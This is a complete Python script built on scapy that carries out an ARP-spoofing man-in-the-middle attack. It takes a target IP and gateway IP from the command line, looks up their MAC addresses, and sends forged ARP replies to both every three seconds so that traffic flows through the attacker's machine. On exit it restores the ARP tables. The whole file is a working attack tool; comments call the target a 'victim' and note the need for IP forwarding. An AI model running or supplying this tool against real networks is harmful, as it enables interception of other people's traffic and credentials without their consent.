import scapy.all as scapy
import time
import optparse
# Be caution before attacking MITM - ip forwarding
# Scan the network and see the ip addr and mac of victim
# op - 2 means arp_request and response , pdst - target_ip ,hwdst - target mac address, psrc - router ip address

# same as network_scanner - getting mac address (previous)
def getting_mac(ip_address):
    Arp_request = scapy.ARP(pdst=ip_address) # Create an ARP request for the specified IP range
    Broad_cast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Create an Ethernet frame for broadcasting
    combined_packet = Broad_cast/Arp_request # Combine the Ether and ARP request
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0] # getting only answered_list [0], Verbose = False (not showing message)

    return answered_list [0] [1].hwsrc # for getting only mac addr we are specifing [0] [1].hwsrc (only the mac) 

def my_poison(target_ip,router_ip):
    target_mac = getting_mac(target_ip)
    sample = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=router_ip)
    #scapy.ls(scapy.ARP())
 
    scapy.send(sample,verbose=False) # sending packet (arp) , verbose = false it means message will not show 

# For reseting ip addr (target ip)
def resetting(victim_ip,gateway_ip):
    victim_mac = getting_mac(victim_ip) 
    gateway_mac = getting_mac(gateway_ip)
    sample = scapy.ARP(op=2,pdst=victim_ip,hwdst=victim_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    #scapy.ls(scapy.ARP())
 
    scapy.send(sample,verbose=False,count=6) # sending packet (arp) , verbose = false it means message will not show 

def user_input():
    object = optparse.OptionParser()
    object.add_option("-t","--target",dest="target_ip",help=" Enter the target ip")
    object.add_option("-g","--gateway",dest="gateway_ip",help="Enter the gateway ip")

    options = object.parse_args()[0]

    if not options.target_ip:
        print("Enter the target ip address!!")
    if not options.gateway_ip:
        print("Enter the gateway ip address!!")
    return options

user_ip = user_input() # calling the user input function
user_target_ip = user_ip.target_ip # Assigning to target_ip 
user_gateway_ip = user_ip.gateway_ip # Assigning ti gateway_ip 


num = 0 # to show how many packet sent
try:
    while True:
        my_poison(user_target_ip,user_gateway_ip)  # "10.32.242.227" - target ip "10.32.242.154" - router ip
        my_poison(user_gateway_ip,user_target_ip)  # Sending packets reverse as MITM attack

        num+=2
        print("\rsending packets "+ str(num),end="") # recursive \r to printing in same line end="" (it run only in python3)

        time.sleep(3) # sending packets in every 3 sec
except KeyboardInterrupt:
    print("\nQuit & reset")

    resetting(user_target_ip,user_gateway_ip)
    resetting(user_gateway_ip,user_target_ip)